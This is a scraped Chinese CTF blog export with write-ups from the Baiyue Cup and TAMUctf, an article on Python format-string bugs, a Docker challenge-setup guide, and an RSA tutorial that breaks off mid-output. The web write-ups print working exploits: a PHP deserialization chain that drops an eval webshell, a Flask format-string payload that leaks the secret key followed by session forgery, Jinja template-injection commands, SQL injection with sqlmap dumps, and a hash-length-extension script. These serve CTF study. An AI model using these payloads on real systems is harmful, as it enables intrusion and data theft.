ser源码12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpclass cls1&#123; var $cls; var $arr; function show()&#123; show_source(__FILE__); &#125; function __wakeup()&#123; foreach($this-&gt;arr as $k =&gt; $v) echo $this-&gt;cls-&gt;$v; &#125;&#125;class cls2&#123; var $filename = 'hello.php'; var $txt = ''; function __get($key)&#123; var_dump($key); if($key == 'fileput') return $this-&gt;fileput(); else return '&lt;p&gt;'.htmlspecialchars($key).'&lt;/p&gt;'; &#125; function fileput()&#123; if(strpos($this-&gt;filename,'../') !== false || strpos($this-&gt;filename,'\\\\') !== false) die(); $content = '&lt;?php die(\\'stupid\\'); ?&gt;'; $content .= $this-&gt;txt; file_put_contents($this-&gt;filename, $content); return htmlspecialchars($content); &#125;&#125;if(!empty($_GET))&#123; $cls = base64_decode($_GET['ser']); $instance = unserialize($cls);&#125;else&#123; $a = new cls1(); $a-&gt;show();&#125; 一道很经典的反序列化题，pop链如下：通过cls1的_wakeup方法调用cls2的_get方法，然后调用fileput方法，绕过里面的退出，写个小马，然后任意命令执行exp如下1234567$c1 = new cls1();$c2 = new cls2();$c1-&gt;cls = $c2;$c1-&gt;arr = ['a'=&gt;'fileput'];$c2-&gt;filename = 'php://filter/write=convert.base64-decode/resource=hello.php';$c2-&gt;txt = 'PD9waHAgZXZhbChAJF9QT1NUWydjbWQnXSk7Pz4=';echo base64_encode(serialize($c1)); 然后直接ser发送过去就会生成hello.php小马，接着菜刀就行 Download it这题考的是php随机函数的安全性漏洞，在SWPU也考过，首先可以看到三张源码图通过源码我们可以确定，考察的就是随机数的安全问题，所以先找种子在index.php里面有个随机数IJiJXvRf，先拿去爆破1234567$str = \"IJiJXvRf\";$rand = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\";for ($i=0; $i&lt;strlen($str); $i++)&#123; $pos = strpos($rand,$str[$i]); echo $pos.\" \".$pos.\" \".\"0 \".(strlen($rand)-1).\" \";&#125; 然后生成32位的随机码123456789101112131415function gen_rand($length)&#123; $chars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\"; $randstr = ''; for ( $i = 0; $i &lt; $length; $i++ ) &#123; $randstr .= $chars[ mt_rand(0, strlen($chars) - 1) ]; &#125; return $randstr;&#125;echo \"&lt;br&gt;\";//IJiJXvRfmt_srand(810504305);echo gen_rand(8);echo \"&lt;br&gt;\";echo gen_rand(32);echo \"&lt;br&gt;\"; 然后读flag1echo authcode(\"filename=flag\",\"ENCODE\",\"OaxSTnku5XqaQ9ly6D14roxGFTF5KbQj\"); 然后将得到的进行url编码接着访问download.php?download=就行了 easy flask这题先去注册登录，然后可以看到有个session解密一下出来是一个id值登录页面发现有id这个参数，遍历一下可以看到id是5时，用户是admin扫下泄露出来一个www.zip ，可以看到，想要拿到flag，必须是管理员12345678@bp_auth.route('/flag')@login_checkdef get_flag(): if(g.user.username==\"admin\"): with open(os.path.dirname(__file__)+'/flag','rb') as f: flag = f.read() return flag return \"Not admin!!\" 继续看下secret.py有个views_info函数123456789101112131415161718192021222324@bp_secert.route('/views',methods = ['GET','POST'])@login_checkdef views_info(): view_id = request.args.get('id') if not view_id: view_id = session.get('user_id') user_m = user.query.filter_by(id=view_id).first() if user_m is None: flash(u\"该用户未注册\") return render_template('secert/views.html') if str(session.get('user_id'))==str(view_id): secert_m = secert.query.filter_by(id=view_id).first() secert_t = u\"&lt;p&gt;&#123;secert.secert&#125;&lt;p&gt;\".format(secert = secert_m) else: secert_t = u\"&lt;p&gt;***************************************&lt;p&gt;\" name = u\"&lt;h1&gt;name:&#123;user_m.username&#125;&lt;h1&gt;\" email = u\"&lt;h2&gt;email:&#123;user_m.email&#125;&lt;h2&gt;\" info = (name+email+secert_t).format(user_m=user_m) return render_template('secert/views.html',info = info) 可以看到，这里有个format函数，里面有name、email和secret_t，继续往上看，还有一个format函数，解析secret_m，secret_m就是页面edit_secret的那个参数，至此，我们就可以利用format格式化字符串漏洞获得secret-key然后session伪造登录payload如下1&#123;user_m.__class__.__mro__[1].__class__.__mro__[0].__init__.__globals__[SQLAlchemy].__init__.__globals__[current_app].config&#125; 最后得到secret_key为ichunqiuQAQ013，接下来就是session的伪造123456789101112from flask import Flask,sessionapp = Flask(__name__)app.config['SECRET_KEY'] = 'ichunqiuQAQ013'def set_id(): session['id'] = 5 return \"ok\"if __name__ == '__main__': app.debug = True app.run() 然后修改session登录访问/flag就有flag misc签到一张数独的图，拿去在线解密一下再将所有数字排成一行加密一下就有了加密出来结果是1cee3860fb3f4a52e615fa8aaf3c91f2b 马男波杰克题目只说了要百度，然后图片名字是atool，猜测是atool加密，去在线解密一下http://www.atool.org/steganography.php 血小板天下第一可爱拿到两张图片，一张血小板，一张缺了两个定位点的二维码，补全一下扫出来这个东西1a2V5JTNBJTIwTHNiXzFzX2dyM2F0 base64解密出来是key: Lsb_1s_gr3at，推测是lsb隐写1python lsb.py extract 123.png 123.txt Lsb_1s_gr3at 出来flag是flag{1_l0ve_LSB~} flag_universe拿到一个数据包，然后去追踪ftp流，这里有个坑，有个flag.txt文件，是个flag来的，接着看到有个new_universe.png文件，将它导出来接着去各种操作，最后发现是lsb隐写，一场比赛考两个lsb隐写……. crypto常规rsa这个打开拿到三个文件，一个pubkey.pem，一个flag.enc，还有一个rsa.py，先去提下公钥信息123456789101112Public-Key: (256 bit)Modulus: 00:89:3f:05:5d:0d:c5:fe:76:4d:88:1d:5c:d6:0e: 96:7b:21:2c:e0:49:45:9e:57:d2:e8:41:ed:4a:81: af:77:edExponent: 9850747023606211927 (0x88b4e239fa48e557)Modulus=893F055D0DC5FE764D881D5CD60E967B212CE049459E57D2E841ED4A81AF77EDwriting RSA key-----BEGIN PUBLIC KEY-----MEIwDQYJKoZIhvcNAQEBBQADMQAwLgIhAIk/BV0Nxf52TYgdXNYOlnshLOBJRZ5X0uhB7UqBr3ftAgkAiLTiOfpI5Vc=-----END PUBLIC KEY----- 看到n比较小，直接去网站分解下n12q = 184333227921154992916659782580114145999p = 336771668019607304680919844592337860739 同时看encrypt函数，可以看见有个try … except ，而且flag.enc 中的数据很大，说明初始的 n 并不是最后加密的 N 值(因为RSA加密需要公钥n的长度至少是大于消息的长度的, 否则加密出来的密文会无法解密. PKCS#1 v1.5的python实现中, 如果公钥n长度小于要加密的消息, 加密会失败)最后exp12345678910111213141516171819202122232425262728293031#!/usr/bin/env python2.7import gmpy2import libnumfrom Crypto.Util.number import getPrimefrom Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5from base64 import b64decodem = b64decode(open('flag.enc','r').read())n = 62078208638445817213739226854534031566665495569130972218813975279479576033261e = 9850747023606211927q = 184333227921154992916659782580114145999p = 336771668019607304680919844592337860739i=1while 1: print i i+=1 n=q*p if n &gt;= int(m.encode('hex'),16): d = libnum.invmod(e,(p-1)*(q-1)) prikey = RSA.construct((int(n),int(e),int(d))) key = PKCS1_v1_5.new(prikey) m = key.decrypt(m,None) break else: p = gmpy2.next_prime(p**2+q**2) q = gmpy2.next_prime(2*q*p) e = gmpy2.next_prime(e**2)print m 最后的flag1flag&#123;f@cToR__N_bY_!teratlnG!&#125; 买手机题目给了一个商店的源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115#!/usr/bin/env python# encoding: utf-8import randomimport stringimport signalimport sysimport osimport timefrom hashlib import sha256from urlparse import parse_qslos.chdir(os.path.dirname(os.path.abspath(__file__)))signkey = ''.join([random.choice(string.letters+string.digits) for _ in xrange(random.randint(8,32))])items = [ ('iPhone X', 7399), ('iPhone 8', 4599), ('P20 Pro', 5488), ('P20', 3788), ('Honor 10', 2399), ('Mi 8', 2999), ('Find X', 4999), ('Nex', 4498), ('Mate10 Pro', 4899), ('Flag', 99999)]money = random.randint(3000, 30000)def list_items(): for i,item in enumerate(items): print '%2d - %-30s$%d' % (i, item[0], item[1])def order(): n = input_int('Product ID: ') if n &lt; 0 or n &gt;= len(items): print 'Invalid ID!' return payment = 'product=%s&amp;price=%d&amp;timestamp=%d' % (items[n][0], items[n][1], time.time()*1000000) sign = sha256(signkey+payment).hexdigest() payment += '&amp;sign=%s' % sign print 'Your order:\\n%s\\n' % paymentdef pay(): global money print 'Your order:' sys.stdout.flush() payment = raw_input().strip() sp = payment.rfind('&amp;sign=') if sp == -1: print 'Invalid Order!' return sign = payment[sp+6:] try: sign = sign.decode('hex') except TypeError: print 'Invalid Order!' return payment = payment[:sp] signchk = sha256(signkey+payment).digest() if signchk != sign: print 'Invalid Order!' return for k,v in parse_qsl(payment): if k == 'product': product = v elif k == 'price': try: price = int(v) except ValueError: print 'Invalid Order!' return if money &lt; price: print 'Go away you poor bastard!' return money -= price print 'Your current money: $%d' % money print 'You have bought %s' % product if product == 'Flag': print 'Well Done! Here is your flag: %s' % open('flag').read().strip()def input_int(prompt): sys.stdout.write(prompt) sys.stdout.flush() try: n = int(raw_input()) return n except: return 0def menu(): print \"CPU Shop\" while True: print \"Money: $%d\" % money print \"1. List Items\" print \"2. Order\" print \"3. Pay\" print \"4. Exit\" sys.stdout.flush() choice = input_int(\"Command: \") &#123; 1: list_items, 2: order, 3: pay, 4: exit, &#125;.get(choice, lambda *args:1)() sys.stdout.flush()if __name__ == \"__main__\": signal.alarm(60) menu() 可以看到，有四个选项，1是显示商品，2是拿到购买命令，3是购买，4是退出，然后操作要在60秒完成，商品有flag，但是买不起，我们先看order函数123payment = 'product=%s&amp;price=%d&amp;timestamp=%d' % (items[n][0], items[n][1], time.time()*1000000)sign = sha256(signkey+payment).hexdigest()payment += '&amp;sign=%s' % sign 可以看到他会将product，price和一个signkey一起加密，接着看pay函数123456789for k,v in parse_qsl(payment): if k == 'product': product = v elif k == 'price': try: price = int(v) except ValueError: print 'Invalid Order!' return 在pay的时候依旧验证hash值，但是这里还有个问题，他会将里面的product拿出来进行覆盖，因此我们可以选一个够钱买的，然后将product名字替换成Flag，就可以买到flag了至于signkey我们不知道怎么办呢，因为他长度不长，只有8-32位，所以可以利用hashpump进行爆破1234567891011121314151617181920212223242526272829303132#! /usr/bin/env # coding: utf-8from hashpumpy import hashpumpfrom pwn import *context.log_level = 'debug'host = '117.50.13.182'port = 8888r = remote(host, port)r.recvuntil('Command: ')r.sendline(b'2')r.recvuntil('ID: ')r.sendline(b'0')r.recvuntil('Your order:\\n')payment = r.recvline().strip().decode()sp = payment.rfind('&amp;sign=')pay = payment[:sp]hexd = payment[sp+6:]print pay,hexdfor i in range(8,34): print i rec = r.recvuntil('Command: ') print rec if 'flag' in rec: print i,rec break r.sendline('3') hashp = hashpump(hexd, pay, '&amp;product=Flag',i) sendpay = hashp[1] + b'&amp;sign=' + hashp[0].encode() r.sendline(sendpay)","comments":true,"permalink":"https://xi4or0uji.github.io/2019/02/24/2018百越杯wp/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"2019tamuctf","date":"2019-02-23T16:00:00.000Z","path":"2019/02/24/2019tamuctf/","text":"WEBNot Another SQLi Challenge最简单的sql注入题，万能密码就能拿到flag了12admin' or 1=1#flag: gigem&#123;f4rm3r5_f4rm3r5_w3'r3_4ll_r16h7&#125; Robots Rule他要求是谷歌的robot访问，抓包改一下 Many Gig’ems to you!这道题很脑洞，index.html、cookies.html和cook.js里面藏有flag所以flag就是gigem{flag_in_source_and_cookies} Science!这道题提示了是用Flask写的，所以尝试一下flask模板注入49确实是能回显49的，接下来就是看有什么可以用了看到有个os类然后就是看有什么文件 1&#123;&#123;url_for.__globals__.os.popen('ls ').read()&#125;&#125; 最后读flag1&#123;&#123;url_for.__globals__.os.popen('cat flag.txt').read()&#125;&#125; 这里有个坑就是这道题用火狐打开浏览器居然崩溃，摇头.gif Buckets这道题对于国内且英文不好的选手有点不友好，毕竟不知道s3 bucket是什么，谷歌一波发现是一个云存储的东西吧，知道一个站点的名字就可以看见存储的东西然后访问一下http://tamuctf.s3.amazonaws.com/看见访问一下就能看到flag了 login app这道题源码可以看到这一段然后可以知道是mongodb注入最后getflaggigem{n0_sql?_n0_pr0bl3m_8a8651c31f16f5dea} Bird Box Challenge很简单的sql注入，一开始我还以为是ssrf搞了半天………. 1337 Secur1ty查看cookie可以看见有个secret，猜测secret是一个表明身份的序号，接下来就是想办法拿到admin的secret值message页面有个id值，直接修改会显示不同的信件，尝试一下sql注入1sqlmap -u http://web6.tamuctf.com/message?id=2 -dbs 1sqlmap -u http://web6.tamuctf.com/message?id=2 -D 1337_Secur1ty --tables 1sqlmap -u http://web6.tamuctf.com/message?id=2 -D 1337_Secur1ty -T Users --columns 1sqlmap -u http://web6.tamuctf.com/message?id=2 -D 1337_Secur1ty -T Users -C UserID,FirstName,LastName,Secret --dump 截止就是伪造身份登录了最后getflaggigem{th3_T0tp_1s_we4k_w1tH_yoU} cryptoRSAaaay题目1234Hey, you're a hacker, right? I think I am too, look at what I made!(2531257, 43)My super secret message: 906851 991083 1780304 2380434 438490 356019 921472 822283 817856 556932 2102538 2501908 2211404 991083 1562919 38268Problem is, I don't remember how to decrypt it... could you help me out? 分解下n然后脚本一把梭123456789101112131415161718import libnumfrom Crypto.Util.number import long_to_bytesp = 509q = 4973n = 2531257e = 43c = [906851,991083,1780304,2380434,438490,356019,921472,822283,817856,556932,2102538,2501908,2211404,991083,1562919,38268]d = libnum.invmod(e,(p-1)*(q-1))for i in c: m = pow(i,d,n) print m#这是上面出来的明文，猜测是ascii码m = [103,105,103,101,109,123,83,97,118,97,103,101,95,83,105,120,95,70,108,121,105,110,103,95,84,105,103,101,114,115,125]str = \"\"for i in m: str += chr(i)print str","comments":true,"permalink":"https://xi4or0uji.github.io/2019/02/24/2019tamuctf/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"},{"name":"crypto","slug":"web/crypto","permalink":"https://xi4or0uji.github.io/categories/web/crypto/"},{"name":"misc","slug":"web/crypto/misc","permalink":"https://xi4or0uji.github.io/categories/web/crypto/misc/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"python格式化字符串","date":"2019-02-20T16:00:00.000Z","path":"2019/02/21/python格式化字符串/","text":"简介就是使用方法不当导致格式化字符串的时候字符串受我们的控制 python常见格式化字符串的方式百分号形式123name = 'Xi4or0uji'print 'My name is %s' %nameMy name is Xi4or0uji 使用标准库中的模板字符串12345from string import Templatename = 'Xi4or0uji's = Template('My name is $name')print s.substitute(name=name)My name is Xi4or0uji 利用format格式化字符串直接格式化字符串12print 'My name is &#123;&#125;'.format('Xi4or0uji')My name is Xi4or0uji 指定位置1234print 'this is a &#123;0&#125;, that is a &#123;1&#125;'.format('cat','dog')this is a cat, that is a dogprint 'this is a &#123;1&#125;, that is a &#123;0&#125;'.format('cat','dog')this is a dog, that is a cat 设置参数12print 'hello &#123;adj&#125; &#123;name&#125;'.format(adj='little',name='h4ck3r')hello little h4ck3r 百分比格式12print '&#123;:.2%&#125; off'.format(0.20)20.00% off 获得数组的键值12print '&#123;arr[2]&#125;'.format(arr=[0,1,2,3,4,5])2 还有很多，不举例了 一个小栗子123456config = &#123;'SECRET_KEY':'lolololol'&#125;class User(object): def __init__(self,name): self.name = nameuser = User('Xi4or0uji')print 'hello &#123;name&#125;'.format(name=user.__class__.__init__.__globals__) 在这里的format如果可以受我们所控，就可以通过原来的对象获得他的所有的变量，从而将敏感信息打印出来 例题2018百越杯 easy flask这题先去注册登录，然后可以看到有个session解密一下出来是一个id值登录页面发现有id这个参数，遍历一下可以看到id是5时，用户是admin扫下泄露出来一个www.zip ，可以看到，想要拿到flag，必须是管理员12345678@bp_auth.route('/flag')@login_checkdef get_flag(): if(g.user.username==\"admin\"): with open(os.path.dirname(__file__)+'/flag','rb') as f: flag = f.read() return flag return \"Not admin!!\" 继续看下secret.py有个views_info函数123456789101112131415161718192021222324@bp_secert.route('/views',methods = ['GET','POST'])@login_checkdef views_info(): view_id = request.args.get('id') if not view_id: view_id = session.get('user_id') user_m = user.query.filter_by(id=view_id).first() if user_m is None: flash(u\"该用户未注册\") return render_template('secert/views.html') if str(session.get('user_id'))==str(view_id): secert_m = secert.query.filter_by(id=view_id).first() secert_t = u\"&lt;p&gt;&#123;secert.secert&#125;&lt;p&gt;\".format(secert = secert_m) else: secert_t = u\"&lt;p&gt;***************************************&lt;p&gt;\" name = u\"&lt;h1&gt;name:&#123;user_m.username&#125;&lt;h1&gt;\" email = u\"&lt;h2&gt;email:&#123;user_m.email&#125;&lt;h2&gt;\" info = (name+email+secert_t).format(user_m=user_m) return render_template('secert/views.html',info = info) 可以看到，这里有个format函数，里面有name、email和secret_t，继续往上看，还有一个format函数，解析secret_m，secret_m就是页面edit_secret的那个参数，至此，我们就可以利用format格式化字符串漏洞获得secret-key然后session伪造登录payload如下1&#123;user_m.__class__.__mro__[1].__class__.__mro__[0].__init__.__globals__[SQLAlchemy].__init__.__globals__[current_app].config&#125; 最后得到secret_key为ichunqiuQAQ013，接下来就是session的伪造123456789101112from flask import Flask,sessionapp = Flask(__name__)app.config['SECRET_KEY'] = 'ichunqiuQAQ013'def set_id(): session['id'] = 5 return \"ok\"if __name__ == '__main__': app.debug = True app.run() 然后修改session登录访问/flag就有flag","comments":true,"permalink":"https://xi4or0uji.github.io/2019/02/21/python格式化字符串/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"python","slug":"python","permalink":"https://xi4or0uji.github.io/tags/python/"}]},{"title":"用docker搭个ctf题目","date":"2019-02-18T16:00:00.000Z","path":"2019/02/19/用docker搭个ctf题目/","text":"最近实验室招新，搭题用到docker，记一下免得以后忘了顺便解释一波，其实docker可以理解成跑在服务器上面的虚拟机，里面有一个个容器，每个容器之间互不干扰，这样子就能很好的让我们部署题目了下面直接上过程找lamp环境1docker search lamp 这里我们用tutum的lamp，然后就拉他的镜像1docker pull tutum/lamp 拉完以后可以检查一下本地的镜像，发现确实有tutum/lamp了1docker images 然后就是建一个docker容器了1docker run -d -p 2333:80 -p 3308:3306 tutum/lamp 这个时候可以看下系统里面的容器1docker ps -a 这个时候可以再去访问一下看下有没有映射成功有了这个页面就行了，剩下的就是部署题目了1docker cp /var/www/html/filename container_id:/var/www/html 这样就能搭好了顺便来一波常用命令123456789101112131415161718#拉镜像docker pull [image]#查看当前镜像docker images#新建容器docker run -d -p [host port]:[docker port] [image]#查看容器docker ps -a#拷贝文件docker cp [outfile] [container id]:[infile]#进去容器docker exec -it [container id] bash#启动容器docker start [container id]#停止容器docker stop [container id]#删除容器(注意要关了容器才能删)docker rm [container id]","comments":true,"permalink":"https://xi4or0uji.github.io/2019/02/19/用docker搭个ctf题目/","categories":[{"name":"docker","slug":"docker","permalink":"https://xi4or0uji.github.io/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://xi4or0uji.github.io/tags/docker/"}]},{"title":"RSA初探","date":"2019-02-11T16:00:00.000Z","path":"2019/02/12/RSA初探/","text":"最近要给新生们出密码学的题，密码学白痴小肉鸡枯了，只能先学一波 简单概要rsa是非对称加密，具体非对称加密是什么就不解释了，网上也有很多介绍，接下来我们直接进入加解密的过程1、选择两个较大的互不相等的质数p和q，计算 n = p * q2、计算 φ = (p-1) * (q-1)3、选取任意e，使得1 &lt; e &lt; φ，而且 gcd ( e , φ ) = 14、计算e关于φ的模逆元d，即 ( e * d ) % φ = 15、加解密：c = ( m ^ e ) % n，m = ( c ^ d ) % n，c为密文，m为明文，(n,e)为公钥对，(n,d)为私钥对 模逆运算如果( a * b ) % c = 1，那么a和b互为对方模c的模逆元或叫数论倒数，也写成假设a和b两个数互为质数，即gcd ( a , b ) = 1时，有 ax + by = 1，所以 ( a * x ) % b = 1，x就是a对b的模逆元，因此，a对b存在模逆元x的充要条件是 gcd ( a , b ) = 1，对于每一组ab，存在一组满足条件的x，在求逆元的时候取最小正整数解 x mod n简单证明123456789证：给予两个整数a、b，必然存在整数x、y使得ax+by=gcd(a,b)两边除gcd(a,b)，右边成了1，左边a和b除了gcd(a,b)以后，新的a和b就互质即证明ax+by=1 gcd(a,b)=1有整数解想要证明ax+by=1 ab互质有整数解，那就是证明(a%b)*x1+b*y1=1有解又辗转相除法可知，gcd(a,b)=gcd(b,a%b)，即ab互质则b和a%b也会互质让a=b,b=a%b，可得b*x1+(a%b)*y1=1继续a=a%b,b=((a%b)%b)，可得(a%b)*x2+((a%b)%b)*y2=1...最后得到a=1,b=0，即1*xn+0*yn=1，显然成立，证毕 求逆元方法欧几里得算法123456789def egcd(a,b): if b==0: return 1,0,a else: x,y,q = egcd(b,a%b) #gcd(a,b) = gcd(b,a%b) x,y = y,(x-(a//b)*y) return x,y,qdef mod_inv(a,b): return egcd(a,b)[0]%b #求a模b得逆元 gmpy2库12import gmpy2print gmpy2.invert(47,30) 欧几里得算法就是辗转相除法12def gcd(a,b): return a if not b else gcd(b,a%b) 扩展欧几里得算法就是上面求逆元的那个迭代1234567def egcd(a,b): if(b==0): return 1,0,a else: x1,y1,q = egcd(b,a%b) x,y = y1,(x1-(a//b)*y1) return x,y,q 例题概念题jarvisoj veryeasyRSA题目给了pqe三个值，要求算d123p = 3487583947589437589237958723892346254777 q = 8767867843568934765983476584376578389e = 65537 当然可以手工算，也可以直接扔去rsatool去算 jarvisoj Easy RSA这题比起原来的题稍微难一点点，给了n，e和密文，要求算明文12已知一段RSA加密的信息为：0xdc2eeeb2782c且已知加密所用的公钥：(N=322831561921859 e = 23) 先去factordb.com分解一下n，算出p和q算出p=13574881，q=23781539，然后rsatool算d，最后直接大数运算乘出来m = ( c ^ d ) % n最后将它转成字符串就行 模数相关攻击直接分解n攻击条件当n小于512位时，可以直接大数分解得到p和q jarvisoj medium rsa题目给了flag.enc和pubkey.pem文件，先用openssl命令提取信息1openssl rsa -pubin -in pubkey.pem -text -modulus 得到123456789101112Public-Key: (256 bit)Modulus: 00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f: 1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f: be:30:ddExponent: 65537 (0x10001)Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DDwriting RSA key-----BEGIN PUBLIC KEY-----MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDryigb/+l/vjDdAgMBAAE=-----END PUBLIC KEY----- 可以知道n是0xC2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD数字不大，直接放去factordb.com分解一下得到12p=275127860351348928173285174381581152299q=319576316814478949870590164193048041239 然后解密1234567891011121314import libnumfrom Crypto.Util.number import long_to_bytesp=275127860351348928173285174381581152299q=319576316814478949870590164193048041239n = 87924348264132406875276140514499937145050893665602592992418171647042491658461e = 65537d = libnum.invmod(e,(p-1)*(q-1))with open('flag.enc','r') as f: c = f.read().encode('hex') c = int(c,16)m = pow(c,d,n)print long_to_bytes(m) p和q选取不当使n可分解攻击条件如果p和q选择不当，使得n可以快速分解|p-q|较大如果p-q很大，那么会有一个数很小，因此可以直接穷举法求出p和q，但是这只是理想|p-q|较小先看一条等式因为|p-q|较小，所以(p-q)²/4也会比较小，因此(p+q)²/4和n相差不大，所以(p+q)/2与√n相近，因此可以这样分解：遍历从1开始一直到√n的整数，直到找到一个整数x满足x² - n是平方数，记做y²，就有x² - n = y²，然后就能根据平方差公式分解出np-1光滑当p是n的因数，而且p-1是光滑的，可以使用Pollard’s p-1算法分解np+1光滑当p时n的因数，而且p+1是光滑的，可以使用William’s p+1算法分解n SECCON2017 very smooth拿到一个pcap文件，分离一下1binwalk -e s.pcap 然后就会有三个证书文件，15A5.crt 8F4.crt FC6.crt提一下信息123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128openssl x509 -inform der -in FC6.crt -pubkey -text -modulus -noout-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDVRqqCXPYd6Xdl9GT7/kiJrYvy8lohddAsi28qwMXCe2cDWuwZKzdB3R9NEnUxsHqwEuuGJBwJwIFJnmnvWurHjcYjDUddp+4X8C9jtvCaLTgd+baSjo2eB0f+uiSL/9/4nN+vR3FliRm2mByeFCjppTQlyioxCqbXYIMxGO4NcQIDAQAB-----END PUBLIC KEY-----Certificate: Data: Version: 1 (0x0) Serial Number: a1:8b:63:0c:7b:30:99:df Signature Algorithm: sha256WithRSAEncryption Issuer: C = JP, ST = Kawasaki, O = SRL Validity Not Before: Oct 8 02:47:17 2017 GMT Not After : Oct 8 02:47:17 2018 GMT Subject: C = JP, ST = Kawasaki, O = SRL Subject Public Key Info: Public Key Algorithm: rsaEncryption Public-Key: (1024 bit) Modulus: 00:d5:46:aa:82:5c:f6:1d:e9:77:65:f4:64:fb:fe: 48:89:ad:8b:f2:f2:5a:21:75:d0:2c:8b:6f:2a:c0: c5:c2:7b:67:03:5a:ec:19:2b:37:41:dd:1f:4d:12: 75:31:b0:7a:b0:12:eb:86:24:1c:09:c0:81:49:9e: 69:ef:5a:ea:c7:8d:c6:23:0d:47:5d:a7:ee:17:f0: 2f:63:b6:f0:9a:2d:38:1d:f9:b6:92:8e:8d:9e:07: 47:fe:ba:24:8b:ff:df:f8:9c:df:af:47:71:65:89: 19:b6:98:1c:9e:14:28:e9:a5:34:25:ca:2a:31:0a: a6:d7:60:83:31:18:ee:0d:71 Exponent: 65537 (0x10001) Signature Algorithm: sha256WithRSAEncryption 78:92:11:fb:6c:e1:7a:f7:2a:33:b8:8b:08:a7:f7:5b:de:cf: 62:0b:a0:ed:be:d0:69:88:38:93:94:9d:05:41:73:bd:7e:b3: 32:ec:8e:10:bc:3a:62:b0:56:c7:c1:3f:60:66:a7:be:b9:46: f7:46:22:6a:f3:5a:25:d5:66:94:57:0e:fc:b5:16:33:05:1c: 6f:f5:85:74:57:a4:a0:c6:ce:4f:fd:64:53:94:a9:83:b8:96: bf:5b:a7:ee:8b:1e:48:a7:d2:43:06:0e:4f:5a:86:62:69:05: e2:c0:bd:4e:89:c9:af:04:4a:77:a2:34:86:6a:b8:d2:3b:32: b7:39Modulus=D546AA825CF61DE97765F464FBFE4889AD8BF2F25A2175D02C8B6F2AC0C5C27B67035AEC192B3741DD1F4D127531B07AB012EB86241C09C081499E69EF5AEAC78DC6230D475DA7EE17F02F63B6F09A2D381DF9B6928E8D9E0747FEBA248BFFDFF89CDFAF4771658919B6981C9E1428E9A53425CA2A310AA6D760833118EE0D71openssl x509 -inform der -in 15A5.crt -pubkey -text -modulus -noout-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDVRqqCXPYd6Xdl9GT7/kiJrYvy8lohddAsi28qwMXCe2cDWuwZKzdB3R9NEnUxsHqwEuuGJBwJwIFJnmnvWurHjcYjDUddp+4X8C9jtvCaLTgd+baSjo2eB0f+uiSL/9/4nN+vR3FliRm2mByeFCjppTQlyioxCqbXYIMxGO4NcQIDAQAB-----END PUBLIC KEY-----Certificate: Data: Version: 1 (0x0) Serial Number: a1:8b:63:0c:7b:30:99:df Signature Algorithm: sha256WithRSAEncryption Issuer: C = JP, ST = Kawasaki, O = SRL Validity Not Before: Oct 8 02:47:17 2017 GMT Not After : Oct 8 02:47:17 2018 GMT Subject: C = JP, ST = Kawasaki, O = SRL Subject Public Key Info: Public Key Algorithm: rsaEncryption Public-Key: (1024 bit) Modulus: 00:d5:46:aa:82:5c:f6:1d:e9:77:65:f4:64:fb:fe: 48:89:ad:8b:f2:f2:5a:21:75:d0:2c:8b:6f:2a:c0: c5:c2:7b:67:03:5a:ec:19:2b:37:41:dd:1f:4d:12: 75:31:b0:7a:b0:12:eb:86:24:1c:09:c0:81:49:9e: 69:ef:5a:ea:c7:8d:c6:23:0d:47:5d:a7:ee:17:f0: 2f:63:b6:f0:9a:2d:38:1d:f9:b6:92:8e:8d:9e:07: 47:fe:ba:24:8b:ff:df:f8:9c:df:af:47:71:65:89: 19:b6:98:1c:9e:14:28:e9:a5:34:25:ca:2a:31:0a: a6:d7:60:83:31:18:ee:0d:71 Exponent: 65537 (0x10001) Signature Algorithm: sha256WithRSAEncryption 78:92:11:fb:6c:e1:7a:f7:2a:33:b8:8b:08:a7:f7:5b:de:cf: 62:0b:a0:ed:be:d0:69:88:38:93:94:9d:05:41:73:bd:7e:b3: 32:ec:8e:10:bc:3a:62:b0:56:c7:c1:3f:60:66:a7:be:b9:46: f7:46:22:6a:f3:5a:25:d5:66:94:57:0e:fc:b5:16:33:05:1c: 6f:f5:85:74:57:a4:a0:c6:ce:4f:fd:64:53:94:a9:83:b8:96: bf:5b:a7:ee:8b:1e:48:a7:d2:43:06:0e:4f:5a:86:62:69:05: e2:c0:bd:4e:89:c9:af:04:4a:77:a2:34:86:6a:b8:d2:3b:32: b7:39Modulus=D546AA825CF61DE97765F464FBFE4889AD8BF2F25A2175D02C8B6F2AC0C5C27B67035AEC192B3741DD1F4D127531B07AB012EB86241C09C081499E69EF5AEAC78DC6230D475DA7EE17F02F63B6F09A2D381DF9B6928E8D9E0747FEBA248BFFDFF89CDFAF4771658919B6981C9E1428E9A53425CA2A310AA6D760833118EE0D71openssl x509 -inform der -in 8F4.crt -pubkey -text -modulus -noout-----BEGIN PUBLIC 